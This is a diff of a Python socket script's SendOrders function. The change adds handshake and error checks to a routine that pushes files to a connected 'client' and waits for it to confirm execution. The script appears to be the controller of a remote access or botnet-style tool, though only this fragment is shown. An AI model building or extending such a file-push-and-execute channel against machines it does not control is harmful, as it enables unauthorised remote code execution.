@@ -49,7 +49,7 @@ def SendOrders(Con):
 
     while True:
 
-        try: # Check If client is online
+        try: # Check If Client is Online
 
             Con.send(str.encode(""))
         except: 
@@ -110,19 +110,48 @@ def SendOrders(Con):
                     print(" - File Error")
                     continue
 
-                Con.send(str.encode(Command)) # Send Command
-                
-                Recv = Con.recv(1024).decode("utf-8")
-                
-                if(Recv == "file"):
+                Con.send(str.encode(Command))
+                                
+                if(Con.recv(1024).decode("utf-8") == "file"):
                 	
                         User = input(" - File Extension -> ")
                         Con.send(str.encode(User))
 
+                        Check = Con.recv(1024).decode("utf-8")
+
+                        if(Check == "errorfile"):
+                            print(" - Error File")
+                            continue
+
+                        elif(Check == "truefile"):
+                            pass
+
+                        else:
+                            print(" - [1] Undefined Reposnse From Client, Try Again")
+                            continue
+
                         Con.sendall(Data) # Send the File
+
+                        print(" - Wait")
+
                         F.close() # Close The File
-                        
-                        print(" - Done")
+
+                        Check = Con.recv(1024).decode("utf-8")
+
+                        if(Check == "executetrue"):
+                            print(" - Done")
+
+                        elif(Check == "executefalse"):
+                            print(" - Error Execute")
+                            continue
+
+                        else:
+                            print(" - [2] Undefined Reposnse From Client , Try Again")
+                            continue
+
+                else:
+                    print(" - [3] Undefined Reposnse From Client , Try Again")
+                    continue
                         
             except:
 
